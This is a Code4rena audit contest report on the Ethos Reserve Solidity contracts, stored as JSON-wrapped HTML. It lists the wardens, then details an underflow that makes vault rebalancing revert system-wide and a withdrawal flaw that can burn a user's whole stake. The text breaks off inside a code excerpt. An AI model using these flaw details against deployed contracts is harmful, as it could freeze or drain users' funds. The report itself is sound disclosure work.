{
  "circa": {
    "title": "Ethos Reserve contest",
    "sponsor": "Ethos Reserve",
    "slug": "2023-02-ethos",
    "date": "2023-05-02",
    "findings": "https://github.com/code-423n4/2023-02-ethos-findings/issues",
    "contest": 216
  },
  "html": "<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<h2 id=\"about-c4\" style=\"position:relative;\"><a href=\"#about-c4\" aria-label=\"about c4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>About C4</h2>\n<p>Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.</p>\n<p>A C4 audit contest is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.</p>\n<p>During the audit contest outlined in this document, C4 conducted an analysis of the Ethos Reserve smart contract system written in Solidity. The audit contest took place between February 16—March 7 2023.</p>\n<h2 id=\"wardens\" style=\"position:relative;\"><a href=\"#wardens\" aria-label=\"wardens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Wardens</h2>\n<p>166 Wardens contributed reports to the Ethos Reserve contest:</p>\n<ol>\n<li>0x3b</li>\n<li><a href=\"https://twitter.com/IAm0x52\">0x52</a></li>\n<li><a href=\"https://twitter.com/0x6980\">0x6980</a></li>\n<li><a href=\"https://twitter.com/3xJanx2009\">0x73696d616f</a></li>\n<li><a href=\"https://twitter.com/0xAgro\">0xAgro</a></li>\n<li><a href=\"https://twitter.com/0xBeirao\">0xBeirao</a></li>\n<li><a href=\"https://twitter.com/ding99ya\">0xDING99YA</a></li>\n<li>0xRobocop</li>\n<li><a href=\"https://twitter.com/0xSmartContract\">0xSmartContract</a></li>\n<li><a href=\"https://twitter.com/MarioPoneder\">0xTheC0der</a></li>\n<li>0xackermann</li>\n<li>0xbepresent</li>\n<li>0xhacksmithh</li>\n<li>0xmuxyz</li>\n<li><a href=\"https://twitter.com/bigbuttdev\">0xnev</a></li>\n<li><a href=\"https://github.com/alex-ppg\">0xsomeone</a></li>\n<li>2997ms</li>\n<li>7siech</li>\n<li><a href=\"https://twitter.com/abarbatei\">ABA</a></li>\n<li><a href=\"https://twitter.com/akshaysrivastv\">AkshaySrivastav</a></li>\n<li>BRONZEDISC</li>\n<li>Bauer</li>\n<li>Bjorn_bug</li>\n<li>Bnke0x0</li>\n<li><a href=\"https://twitter.com/bobface16\">Bobface</a></li>\n<li>Bough</li>\n<li>Breeje</li>\n<li>Budaghyan</li>\n<li><a href=\"https://twitter.com/Conan0x3\">Co0nan</a></li>\n<li><a href=\"https://twitter.com/CodeFoxInc\">CodeFoxInc</a> (<a href=\"https://twitter.com/Markwu_crypto\">thurendous</a> and TerrierLover and retocrooman)</li>\n<li>CodingNameKiki</li>\n<li><a href=\"https://twitter.com/DadeKuma\">DadeKuma</a></li>\n<li>Darshan</li>\n<li>DeFiHackLabs (SunSec and gbaleee and 0x4non and <a href=\"https://twitter.com/tamjid0x01\">Aits</a> and <a href=\"https://twitter.com/rappenstein2\">Rappie</a>)</li>\n<li><a href=\"https://twitter.com/Deivitto\">Deivitto</a></li>\n<li><a href=\"https://franfran.dev/\">Franfran</a></li>\n<li><a href=\"https://twitter.com/gallodasballo\">GalloDaSballo</a></li>\n<li>GreedyGoblin</li>\n<li>Haipls</li>\n<li>IceBear</li>\n<li><a href=\"https://www.linkedin.com/in/aniruddha-dhumal/\">Inspectah</a></li>\n<li><a href=\"https://twitter.com/0xJCN\">JCN</a></li>\n<li>Josiah</li>\n<li>KIntern_NA (TrungOre and duc and Trumpero)</li>\n<li><a href=\"https://www.linkedin.com/in/kayode-okunlade-862001142/\">Kaysoft</a></li>\n<li>KingNFT</li>\n<li><a href=\"https://twitter.com/KoolexC\">Koolex</a></li>\n<li>Krace</li>\n<li>Lavishq</li>\n<li>LethL</li>\n<li>Madalad</li>\n<li><a href=\"https://milotruck.github.io/\">MiloTruck</a></li>\n<li>MiniGlome</li>\n<li>MohammedRizwan</li>\n<li>Morraez</li>\n<li><a href=\"https://twitter.com/0xcharwak\">Norah</a></li>\n<li>P-384</li>\n<li>PaludoX0</li>\n<li>Parad0x</li>\n<li><a href=\"https://www.linkedin.com/in/pawe%C5%82-k%C4%99dzia-b4094813b/\">PawelK</a></li>\n<li>Phantasmagoria</li>\n<li>Praise</li>\n<li><a href=\"https://twitter.com/adigunq_adigun\">Qeew</a></li>\n<li>RHaO-sec</li>\n<li>Rageur</li>\n<li><a href=\"https://raiders0786.github.io/Portfolio/\">Raiders</a></li>\n<li>RaymondFam</li>\n<li>ReyAdmirado</li>\n<li><a href=\"https://rickardlarsson22.github.io/\">Rickard</a></li>\n<li>Rolezn</li>\n<li>SaeedAlipoor01988</li>\n<li>Saintcode_</li>\n<li><a href=\"https://www.linkedin.com/in/sathishkumar-p-26069915a\">Sathish9098</a></li>\n<li>SleepingBugs (<a href=\"https://twitter.com/Deivitto\">Deivitto</a> and 0xLovesleep)</li>\n<li>SuperRayss</li>\n<li><a href=\"https://twitter.com/theuwuteddy\">TheSavageTeddy</a></li>\n<li><a href=\"https://twitter.com/meidhiwirara\">Tomio</a></li>\n<li>UdarTeam (ahmedov and tourist)</li>\n<li><a href=\"https://github.com/udsene\">Udsen</a></li>\n<li>V_B (Barichek and vlad_bochok)</li>\n<li>Viktor_Cortess</li>\n<li>abiih</li>\n<li>adeolu</li>\n<li>arialblack14</li>\n<li>ast3ros</li>\n<li>atharvasama</li>\n<li><a href=\"https://twitter.com/azhar0406\">azhar</a></li>\n<li><a href=\"https://twitter.com/0xbanky\">banky</a></li>\n<li><a href=\"https://twitter.com/bin2chen\">bin2chen</a></li>\n<li>brgltd</li>\n<li>btk</li>\n<li><a href=\"https://twitter.com/c3ph_\">c3phas</a></li>\n<li><a href=\"https://twitter.com/CatellaTech\">catellatech</a></li>\n<li>ch0bu</li>\n<li>chaduke</li>\n<li>chrisdior4</li>\n<li><a href=\"https://twitter.com/codeIslight\">codeislight</a></li>\n<li>cryptonue</li>\n<li><a href=\"https://twitter.com/csanuragjain\">csanuragjain</a></li>\n<li>d3e4</li>\n<li>ddimitrov22</li>\n<li>dec3ntraliz3d</li>\n<li>decade</li>\n<li>delfin454000</li>\n<li>descharre</li>\n<li><a href=\"https://twitter.com/im_Dharma09\">dharma09</a></li>\n<li>dontonka</li>\n<li>eierina</li>\n<li><a href=\"https://twitter.com/emmac002\">emmac002</a></li>\n<li><a href=\"https://twitter.com/eyexploit\">eyexploit</a></li>\n<li><a href=\"https://twitter.com/favelanky\">favelanky</a></li>\n<li>fs0c</li>\n<li>gjaldon</li>\n<li><a href=\"https://github.com/hacker-DOM\">hacker-dom</a></li>\n<li><a href=\"https://twitter.com/hansfriese\">hansfriese</a></li>\n<li>helios</li>\n<li>hl_</li>\n<li><a href=\"https://twitter.com/hunt3r_w3b\">hunter_w3b</a></li>\n<li><a href=\"https://twitter.com/0xhyh\">hyh</a></li>\n<li>imare</li>\n<li>jasonxiale</li>\n<li><a href=\"https://twitter.com/JoeStakey\">joestakey</a></li>\n<li><a href=\"https://twitter.com/0xKaden\">kaden</a></li>\n<li>kodyvim</li>\n<li>koxuan</li>\n<li>ltyu</li>\n<li>lukris02</li>\n<li>luxartvinsec</li>\n<li><a href=\"https://github.com/martin-petrov03\">martin</a></li>\n<li>matrix_0wl</li>\n<li>nemveer</li>\n<li><a href=\"https://twitter.com/andyfeili\">oyc_109</a></li>\n<li><a href=\"https://twitter.com/@PavanKumarKv2\">pavankv</a></li>\n<li><a href=\"https://twitter.com/peak_bolt\">peakbolt</a></li>\n<li>peanuts</li>\n<li>peritoflores</li>\n<li>rbserver</li>\n<li>ronnyx2017</li>\n<li>rvi0x</li>\n<li>rvierdiiev</li>\n<li>scokaf (Scoon and jauvany)</li>\n<li><a href=\"https://github.com/seeu-inspace\">seeu</a></li>\n<li>shark</li>\n<li><a href=\"https://twitter.com/harshit16024263\">supernova</a></li>\n<li>tnevler</li>\n<li>tonisives</li>\n<li>trustindistrust</li>\n<li><a href=\"https://twitter.com/cvetanovv0\">tsvetanovv</a></li>\n<li>ulqiorra</li>\n<li>vagrant</li>\n<li><a href=\"https://twitter.com/kzalloc1\">wtin</a></li>\n<li><a href=\"https://twitter.com/yamapyblack\">yamapyblack</a></li>\n<li>yongskiws</li>\n<li>zzzitron</li>\n</ol>\n<p>This contest was judged by <a href=\"https://github.com/trust1995\">Trust</a>.</p>\n<p>Final report assembled by <a href=\"https://twitter.com/liveactionllama\">liveactionllama</a>.</p>\n<h1 id=\"summary\" style=\"position:relative;\"><a href=\"#summary\" aria-label=\"summary permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Summary</h1>\n<p>The C4 analysis yielded an aggregated total of 17 unique vulnerabilities. Of these vulnerabilities, 3 received a risk rating in the category of HIGH severity and 14 received a risk rating in the category of MEDIUM severity.</p>\n<p>Additionally, C4 analysis included 110 reports detailing issues with a risk rating of LOW severity or non-critical. There were also 58 reports recommending gas optimizations.</p>\n<p>All of the issues presented here are linked back to their original finding.</p>\n<h1 id=\"scope\" style=\"position:relative;\"><a href=\"#scope\" aria-label=\"scope permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scope</h1>\n<p>The code under review can be found within the <a href=\"https://github.com/code-423n4/2023-02-ethos\">C4 Ethos Reserve contest repository</a>, and is composed of 12 smart contracts written in the Solidity programming language and includes 3,221 lines of Solidity code.</p>\n<h1 id=\"severity-criteria\" style=\"position:relative;\"><a href=\"#severity-criteria\" aria-label=\"severity criteria permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Severity Criteria</h1>\n<p>C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.</p>\n<p>High-level considerations for vulnerabilities span the following key areas when conducting assessments:</p>\n<ul>\n<li>Malicious Input Handling</li>\n<li>Escalation of privileges</li>\n<li>Arithmetic</li>\n<li>Gas use</li>\n</ul>\n<p>For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on <a href=\"https://code4rena.com\">the C4 website</a>, specifically our section on <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">Severity Categorization</a>.</p>\n<h1 id=\"high-risk-findings-3\" style=\"position:relative;\"><a href=\"#high-risk-findings-3\" aria-label=\"high risk findings 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>High Risk Findings (3)</h1>\n<h2 id=\"h-01-re-balancing-the-vault-allocation-may-always-revert-when-distributing-profits-resulting-of-a-massive-system-dos--\" style=\"position:relative;\"><a href=\"#h-01-re-balancing-the-vault-allocation-may-always-revert-when-distributing-profits-resulting-of-a-massive-system-dos--\" aria-label=\"h 01 re balancing the vault allocation may always revert when distributing profits resulting of a massive system dos   permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/481\">[H-01] Re-balancing the vault allocation may always revert when distributing profits: resulting of a massive system DOS  </a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/481\">0xBeirao</a>, also found by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/749\">bin2chen</a></em></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L486-L500\">updateRewardSum</a></strong> function call <strong><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L493\">_computeRewardsPerUnitStaked</a></strong> with <strong>_debtToOffset</strong> set to 0. Meaning that the assignment <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L531\">L531</a> will revert if <code>lastLUSDLossError_Offset != 0</code> (which is likely the case) because we try to assign a negative value to an <strong>uint</strong>.</p>\n<h3 id=\"impact\" style=\"position:relative;\"><a href=\"#impact\" aria-label=\"impact permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L239\">_rebalance()</a></strong> will be definitely DOS if the profit is greater than the <strong><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L252\">yieldClainThreshold</a></strong> ⇒ <strong><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L286\">vars.profit != 0</a></strong>.</p>\n<p>Because they call <strong>_rebalance()</strong> all these functions will be DOS :</p>\n<p>In <code>BorrowerOperations</code> 100% DOS</p>\n<ul>\n<li>openTrove</li>\n<li>closeTrove</li>\n<li>_adjustTrove</li>\n<li>addColl, withdrawColl</li>\n<li>withdrawLUSD, repayLUSD</li>\n</ul>\n<p>In <code>TroveManager</code> 80% DOS</p>\n<ul>\n<li>liquidateTroves</li>\n<li>batchLiquidateTroves</li>\n<li>redeemCloseTrove</li>\n</ul>\n<h3 id=\"proof-of-concept\" style=\"position:relative;\"><a href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Context : the vault has compound enough profit to withdraw. (<a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L252\">here</a>)</p>\n<p>Alice initiates a trove liquidation. <strong><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L466\">offset()</a></strong> in <code>StabilityPool</code> is called to cancels out the trove debt against the LUSD contained in the Stability Pool.</p>\n<p>A floor division errors occur so now <strong><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L537\">lastLUSDLossError_Offset</a></strong> is not null.</p>\n<p>Now, every time <strong><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L305\">_rebalance()</a></strong> is called the transaction will revert.</p>\n<h3 id=\"recommended-mitigation\" style=\"position:relative;\"><a href=\"#recommended-mitigation\" aria-label=\"recommended mitigation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation</h3>\n<p>In <a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L504-L544\">StabilityPool.sol#L504-L544</a>, just skip the floor division errors calculation if <code>_debtToOffset == 0</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"0\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_debtToOffset</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t[</span><span class=\"mtk12\">StabilityPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">#</span><span class=\"mtk12\">L526</span><span class=\"mtk1\">-</span><span class=\"mtk12\">L538</span><span class=\"mtk1\">](</span><span class=\"mtk12\">https</span><span class=\"mtk1\">:</span><span class=\"mtk3\">//github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/StabilityPool.sol#L526-L538)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/481#issuecomment-1516723296\">tess3rac7 (Ethos Reserve) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-02-user-can-lose-up-to-whole-stake-on-vault-withdrawal-when-there-are-funds-locked-in-the-strategy\" style=\"position:relative;\"><a href=\"#h-02-user-can-lose-up-to-whole-stake-on-vault-withdrawal-when-there-are-funds-locked-in-the-strategy\" aria-label=\"h 02 user can lose up to whole stake on vault withdrawal when there are funds locked in the strategy permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/288\">[H-02] User can lose up to whole stake on vault withdrawal when there are funds locked in the strategy</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/288\">hyh</a>, also found by <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/723\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/502\">koxuan</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/468\">Koolex</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/461\">Parad0x</a>, <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/441\">jasonxiale</a>, and <a href=\"https://github.com/code-423n4/2023-02-ethos-findings/issues/76\">chaduke</a></em></p>\n<p>ReaperVaultV2’s <code>withdrawMaxLoss</code> isn’t honoured when there are any locked funds in the strategy. Locked funds mean that there is a gap between requested and returned amount other than the loss reported. This is valid behavior of a strategy, but in this case realized loss is miscalculated in _withdraw() and a withdrawing user will receive less funds, while having all the shares burned.</p>\n<h3 id=\"impact-1\" style=\"position:relative;\"><a href=\"#impact-1\" aria-label=\"impact 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Users can lose up to the whole asset amount due as all their requested shares can be burned, while only available amount be transferred to them. This amount can be arbitrary low.</p>\n<p>The behaviour is not controlled by <code>withdrawMaxLoss</code> limit and is conditional only on a strategy having some funds locked (i.e. strategy experiencing liquidity squeeze).</p>\n<h3 id=\"proof-of-concept-1\" style=\"position:relative;\"><a href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><code>_withdraw()</code> resets <code>value</code> to be <code>token.balanceOf(address(this))</code> when the balance isn’t enough for withdrawal:</p>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L357-L412\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultV2.sol#L357-L412</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"1\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Internal helper function to burn {_shares} of vault shares belonging to {_owner}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// and return corresponding assets to {_receiver}. Returns the number of assets that were returned.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_withdraw</span><span class=\"mtk1\">(</span></span></span>\n<span 